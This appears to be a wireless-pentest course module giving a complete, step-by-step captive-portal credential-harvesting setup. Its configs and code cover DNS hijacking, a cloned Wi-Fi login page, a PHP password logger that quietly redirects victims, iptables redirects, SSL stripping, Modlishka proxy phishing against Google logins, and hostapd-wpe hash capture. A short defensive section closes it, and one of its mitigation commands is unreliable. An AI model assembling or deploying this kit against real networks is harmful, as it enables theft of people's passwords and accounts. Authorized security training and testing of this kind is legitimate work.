# Module 10 — Captive Portals & Credential Harvesting

> **Prerequisites:** [Module 09 — Evil Twin Access Points](../module-09-evil-twin/)
> **Next Module:** [Module 11 — WPS Attacks](../module-11-wps-attacks/)

> **Legal Disclaimer:** Captive portal credential harvesting must only be performed on networks and systems you own or have **explicit written authorization** to test. Unauthorized interception of credentials is a criminal offence under the CFAA, the UK Computer Misuse Act, and equivalent legislation worldwide.

---

## Table of Contents

1. [What Is a Captive Portal Attack?](#1-what-is-a-captive-portal-attack)
2. [Attack Architecture Overview](#2-attack-architecture-overview)
3. [DNS Hijacking with dnsmasq](#3-dns-hijacking-with-dnsmasq)
4. [Building the Credential Capture Page](#4-building-the-credential-capture-page)
5. [Web Server Setup with nginx](#5-web-server-setup-with-nginx)
6. [PHP Credential Logger](#6-php-credential-logger)
7. [iptables Redirect Rules](#7-iptables-redirect-rules)
8. [SSL Stripping](#8-ssl-stripping)
9. [bettercap + Modlishka Integration](#9-bettercap--modlishka-integration)
10. [WPA2-Enterprise Credential Phishing](#10-wpa2-enterprise-credential-phishing)
11. [Detection & Countermeasures](#11-detection--countermeasures)
12. [Knowledge Check](#12-knowledge-check)

---

## 1. What Is a Captive Portal Attack?

### Overview

A **captive portal** is a web page that intercepts all HTTP(S) traffic from a newly connected client and redirects it to a login or splash page. Hotels, airports, and coffee shops use them legitimately. Attackers weaponise them on Evil Twin APs (Module 09) to harvest credentials.

```
Victim connects to Evil Twin AP
          │
          ▼
Victim opens browser → "google.com"
          │
          ▼
DNS query → dnsmasq → returns 10.0.0.1 (attacker) for ALL domains
          │
          ▼
HTTP request → nginx on 10.0.0.1 → serves fake login page
          │
          ▼
Victim submits credentials → PHP logger → saved to /var/log/harvested.log
          │
          ▼
Victim redirected to real site (transparency)
```

### What Can Be Captured

| Target | Credential Type | Technique |
|--------|----------------|-----------|
| Wi-Fi password | WPA2-PSK passphrase | "Reconnect" portal |
| Email/social login | Username + password | Cloned login page |
| Corporate SSO | Active Directory creds | NTLM relay or portal |
| Payment details | Credit card data | Cloned checkout page |
| WPA-Enterprise | MSCHAPv2 hash | hostapd-wpe (Module 13) |

---

## 2. Attack Architecture Overview

### Component Stack

```
┌─────────────────────────────────────────────────────┐
│                  Attacker Machine                    │
│                                                      │
│  ┌──────────┐   ┌──────────┐   ┌──────────────────┐ │
│  │ hostapd  │   │ dnsmasq  │   │  nginx + PHP     │ │
│  │ (rogue   │   │ (DHCP +  │   │  (captive portal │ │
│  │  AP)     │   │  DNS     │   │   + logger)      │ │
│  │          │   │  hijack) │   │                  │ │
│  └──────────┘   └──────────┘   └──────────────────┘ │
│       │               │               │              │
│  ┌────▼───────────────▼───────────────▼────────────┐ │
│  │              wlan1 (AP interface)                │ │
│  │              IP: 10.0.0.1                        │ │
│  └──────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────┘
                        │
              victim connects here
```

### Required Services

| Service | Port | Role |
|---------|------|------|
| hostapd | — | AP beacon, client association |
| dnsmasq | UDP 53, UDP 67 | DNS hijack + DHCP |
| nginx | TCP 80, TCP 443 | Serve portal page |
| PHP-FPM | — | Process form POST, log creds |
| iptables | — | Redirect all HTTP to nginx |

---

## 3. DNS Hijacking with dnsmasq

The key to forcing clients to your portal is returning your IP for **every** DNS query — this is the "wildcard" redirect.

### dnsmasq Captive Portal Config

Create `/etc/dnsmasq_portal.conf`:

```ini
interface=wlan1
no-resolv

# Answer ALL DNS queries with attacker IP
address=/#/10.0.0.1

# DHCP pool
dhcp-range=10.0.0.10,10.0.0.100,1h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1

# Log everything
log-queries
log-dhcp
log-facility=/var/log/dnsmasq_portal.log
```

> The `address=/#/10.0.0.1` directive is the critical line. `#` is a wildcard matching all domain names.

### Verifying DNS Hijack

```bash
# From a test client connected to the evil twin:
nslookup google.com 10.0.0.1
# Should return 10.0.0.1 instead of real Google IPs

# On attacker, watch DNS queries in real time:
sudo tail -f /var/log/dnsmasq_portal.log
```

### Selective Hijacking

For a subtler attack, only redirect specific domains and forward everything else:

```ini
# Only redirect these domains to portal
address=/facebook.com/10.0.0.1
address=/google.com/10.0.0.1

# Forward all other DNS upstream normally
server=8.8.8.8
```

---

## 4. Building the Credential Capture Page

### Cloning a Target Login Page

The most convincing portals clone the target organization's real login page.

```bash
# Clone a login page with wget
wget --mirror --convert-links --page-requisites \
     --no-parent -P /var/www/portal/ \
     https://login.example.com/

# Or use httrack for more robust cloning
sudo apt install httrack
httrack https://login.example.com/ -O /var/www/portal/
```

### Minimal Credential Harvester HTML

For a generic "Wi-Fi reconnect" portal (`/var/www/portal/index.html`):

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>WiFi Login — CoffeeShop</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f5f5f5;
           display: flex; justify-content: center; align-items: center; height: 100vh; }
    .box { background: white; padding: 40px; border-radius: 10px;
           box-shadow: 0 2px 20px rgba(0,0,0,0.1); width: 360px; }
    h2 { margin-bottom: 24px; color: #333; }
    input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ddd;
            border-radius: 6px; font-size: 14px; box-sizing: border-box; }
    button { width: 100%; padding: 12px; background: #0078d4; color: white;
             border: none; border-radius: 6px; font-size: 15px; cursor: pointer; }
    .note { font-size: 12px; color: #888; margin-top: 16px; text-align: center; }
  </style>
</head>
<body>
  <div class="box">
    <h2>&#128246; CoffeeShop WiFi</h2>
    <p style="color:#555;margin-bottom:20px;">Your session has expired. Please log in again to continue.</p>
    <form method="POST" action="/capture.php">
      <input type="text"     name="username" placeholder="Email or username" required />
      <input type="password" name="password" placeholder="Password"          required />
      <button type="submit">Connect to WiFi</button>
    </form>
    <p class="note">By connecting you agree to our terms of service.</p>
  </div>
</body>
</html>
```

### Wi-Fi Password Prompt Variant

For capturing WPA2 passphrases — tell the user the password has changed:

```html
<h2>&#128246; Network Security Update</h2>
<p>We recently updated our network security. Please re-enter the WiFi password to reconnect.</p>
<form method="POST" action="/capture.php">
  <input type="text"     name="network"  value="CoffeeShop" readonly />
  <input type="password" name="password" placeholder="WiFi Password" required />
  <button type="submit">Reconnect</button>
</form>
```

---

## 5. Web Server Setup with nginx

### Install nginx

```bash
sudo apt install nginx php-fpm
```

### nginx Configuration

Create `/etc/nginx/sites-available/portal`:

```nginx
server {
    listen 80 default_server;
    server_name _;                  # catch-all vhost

    root /var/www/portal;
    index index.html index.php;

    # Serve static portal files
    location / {
        try_files $uri $uri/ =404;
    }

    # PHP handler for credential capture script
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
    }

    # Redirect all 404s to portal (captive portal catch-all)
    error_page 404 /index.html;

    # Log access for forensics
    access_log /var/log/nginx/portal_access.log;
    error_log  /var/log/nginx/portal_error.log;
}
```

### Enable & Start

```bash
sudo ln -s /etc/nginx/sites-available/portal /etc/nginx/sites-enabled/
sudo rm /etc/nginx/sites-enabled/default
sudo systemctl restart nginx php8.1-fpm

# Verify
curl -s http://10.0.0.1/ | head -20
```

---

## 6. PHP Credential Logger

### capture.php

Place at `/var/www/portal/capture.php`:

```php
<?php
// Capture and log submitted credentials
$username = htmlspecialchars($_POST['username'] ?? '');
$password = htmlspecialchars($_POST['password'] ?? '');
$ip       = $_SERVER['REMOTE_ADDR'];
$ua       = $_SERVER['HTTP_USER_AGENT'];
$ts       = date('Y-m-d H:i:s');

// Log to file
$entry = "[$ts] IP=$ip | USER=$username | PASS=$password | UA=$ua\n";
file_put_contents('/var/log/harvested.log', $entry, FILE_APPEND | LOCK_EX);

// Redirect victim to real site (appear legitimate)
header('Location: https://www.google.com');
exit();
?>
```

### Monitoring Captured Credentials

```bash
# Watch log in real time
sudo tail -f /var/log/harvested.log

# Example output:
# [2024-03-15 14:23:11] IP=10.0.0.42 | USER=alice@corp.com | PASS=Summer2024! | UA=Mozilla/5.0 ...
# [2024-03-15 14:25:03] IP=10.0.0.55 | USER=bob          | PASS=CoffeeShop1  | UA=iPhone; CPU ...
```

### Advanced: Log Additional Headers

```php
<?php
$headers = [
    'username'    => $_POST['username'] ?? '',
    'password'    => $_POST['password'] ?? '',
    'ip'          => $_SERVER['REMOTE_ADDR'],
    'user_agent'  => $_SERVER['HTTP_USER_AGENT'],
    'referer'     => $_SERVER['HTTP_REFERER'] ?? '',
    'accept_lang' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '',
    'timestamp'   => date('c'),
];

file_put_contents(
    '/var/log/harvested.json',
    json_encode($headers) . "\n",
    FILE_APPEND | LOCK_EX
);

header('Location: https://www.google.com');
exit();
?>
```

---

## 7. iptables Redirect Rules

To ensure even clients who type an IP directly (or whose browsers cache old DNS) still hit your portal, use iptables to redirect all outbound HTTP traffic to nginx.

### Redirect HTTP to nginx

```bash
# Redirect all TCP port 80 traffic from AP interface to local nginx
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 \
  -j REDIRECT --to-port 80

# Redirect HTTPS to nginx (for SSL stripping setup — see next section)
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 \
  -j REDIRECT --to-port 443

# Allow DNS out (53 UDP) so dnsmasq works
sudo iptables -A INPUT -i wlan1 -p udp --dport 53 -j ACCEPT

# Block internet access until credentials submitted (optional aggressive mode)
# sudo iptables -A FORWARD -i wlan1 -j DROP
```

### Verify Rules

```bash
sudo iptables -t nat -L PREROUTING -n -v
```

---

## 8. SSL Stripping

Modern browsers default to HTTPS. SSL stripping downgrades HTTPS connections to HTTP so the portal can intercept them.

### What Is SSL Stripping?

```
Normal flow:   Client → HTTPS → Server
After strip:   Client → HTTP → Attacker → HTTPS → Server
                                   ↓
                           Attacker reads plaintext
```

### Using bettercap for SSL Strip

```bash
sudo bettercap -iface wlan1

# Inside bettercap:
> net.probe on
> set arp.spoof.targets 10.0.0.0/24
> arp.spoof on
> set https.proxy.sslstrip true
> https.proxy on
> http.proxy on
> net.sniff on
```

### HSTS Bypass Limitations

**HTTP Strict Transport Security (HSTS)** and **HSTS Preloading** make SSL stripping ineffective against major sites (Google, Facebook, etc.) in modern browsers. Effective against:
- Internal corporate portals without HSTS
- Older applications
- Custom enterprise software

```bash
# View bettercap captured credentials
> events.show
```

---

## 9. bettercap + Modlishka Integration

**Modlishka** is a reverse proxy that can transparently proxy a real login site, capturing credentials without needing a cloned page — valid TLS certificate is presented by proxying the real site.

### Installing Modlishka

```bash
# Install Go first
sudo apt install golang-go

# Clone and build Modlishka
git clone https://github.com/drk1wi/Modlishka.git
cd Modlishka
go build -o modlishka main.go
```

### Modlishka Configuration

Create `modlishka.json`:

```json
{
  "proxyDomain":    "coffeeshop.evil",
  "listeningPort":  "443",
  "target":         "accounts.google.com",
  "targetResources": "google.com",
  "cert":           "/etc/ssl/certs/evil.crt",
  "certKey":        "/etc/ssl/private/evil.key",
  "certPool":       "/etc/ssl/certs/evil-ca.crt",
  "credParams":     "username[],password[]",
  "log":            "/var/log/modlishka.log"
}
```

### Running Modlishka

```bash
sudo ./modlishka -config modlishka.json

# DNS must point coffeeshop.evil → 10.0.0.1
# dnsmasq: address=/coffeeshop.evil/10.0.0.1
```

> **Note:** Modlishka requires issuing a custom CA certificate and installing it as trusted on the victim's device — or relying on the victim ignoring certificate warnings.

---

## 10. WPA2-Enterprise Credential Phishing

When targeting WPA2-Enterprise networks (Module 13), the captive portal approach shifts to an **EAP credential theft** model using `hostapd-wpe`.

### Overview

```
Victim laptop has profile: "CorpWiFi" (WPA2-Enterprise / PEAP)
     │
     ▼
Evil twin broadcasts "CorpWiFi"
     │
     ▼
Victim's supplicant auto-connects, sends EAP identity
     │
     ▼
hostapd-wpe presents fake RADIUS / captures MSCHAPv2 hash
     │
     ▼
Hash cracked offline with asleap or hashcat (Module 13)
```

### Install hostapd-wpe

```bash
sudo apt install hostapd-wpe
```

### hostapd-wpe Configuration

```ini
interface=wlan1
driver=nl80211
ssid=CorpWiFi
hw_mode=g
channel=6

# WPA2-Enterprise
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
```

### Running and Capturing Hashes

```bash
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Output when a client connects:
# hostapd-wpe: mschapv2: Thu Mar 15 14:30:22 2024
#   username: alice@corp.com
#   challenge: 5d9b4b1f3a2e7c8d
#   response:  a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4

# Crack with asleap:
sudo asleap -C 5d9b4b1f3a2e7c8d -R a1b2c3...  -W /usr/share/wordlists/rockyou.txt
```

---

## 11. Detection & Countermeasures

### How Defenders Detect Captive Portal Attacks

| Indicator | Detection |
|-----------|-----------|
| DNS wildcard | All queries return same IP |
| Certificate mismatch | Browser TLS warning for HTTPS sites |
| WIPS alert | Duplicate SSID detected |
| Unexpected redirect | URL changes on any domain navigation |
| No HSTS | Sites that normally enforce HSTS load over HTTP |

### User-Facing Red Flags

- Browser shows a certificate warning or "Not Secure"
- URL bar shows `http://` for sites that are always `https://`
- Login page looks slightly wrong (fonts, layout, logo)
- After "login", redirected to Google/home page unexpectedly

### Network-Side Mitigations

```bash
# On enterprise APs: enable WIDS
# Cisco: rogue-detection enable
# Aruba: ids-policy profile rogue-ap-detection

# Force 802.1X with server certificate validation in supplicant profile
# Windows:
netsh wlan set profileparameter name="CorpWiFi" \
      connectiontype=ESS connectionmode=auto \
      authentication=WPA2Enterprise encryption=AES \
      keytype=passphrase

# Linux wpa_supplicant — enforce CA cert validation:
# ca_cert="/etc/ssl/certs/corp-ca.pem"
# peap_outer_success=0
```

### Client Mitigations

1. **Use a VPN** — credentials in VPN tunnel are encrypted end-to-end
2. **Never ignore TLS certificate warnings**
3. **Check the URL** — a login page at `10.0.0.1` is always suspicious
4. **Disable auto-connect** to known open networks on mobile devices
5. **Enable HTTPS-only mode** in Firefox/Chrome

---

## 12. Knowledge Check

Before proceeding to Module 11, you should be able to answer:

1. What is the role of `address=/#/10.0.0.1` in the dnsmasq configuration for a captive portal attack?
2. Describe the complete flow from a victim connecting to an evil twin AP to submitting credentials on the captive portal.
3. What nginx configuration directive ensures all unmatched URLs are redirected to the portal page?
4. Write the PHP snippet that logs the `username` and `password` POST fields along with the client's IP address to a file.
5. What iptables rule redirects all TCP port 80 traffic arriving on `wlan1` to local port 80?
6. What is SSL stripping and why is it less effective against major websites in 2024?
7. What is HSTS preloading and why does it prevent SSL stripping against sites like Google?
8. How does Modlishka differ from a traditional cloned-page captive portal, and what is required for it to work?
9. Explain how `hostapd-wpe` captures credentials from WPA2-Enterprise clients without knowing the password.
10. Name three client-visible indicators that a captive portal is malicious rather than legitimate.

---

**Next:** [Module 11 — WPS Attacks](../module-11-wps-attacks/)
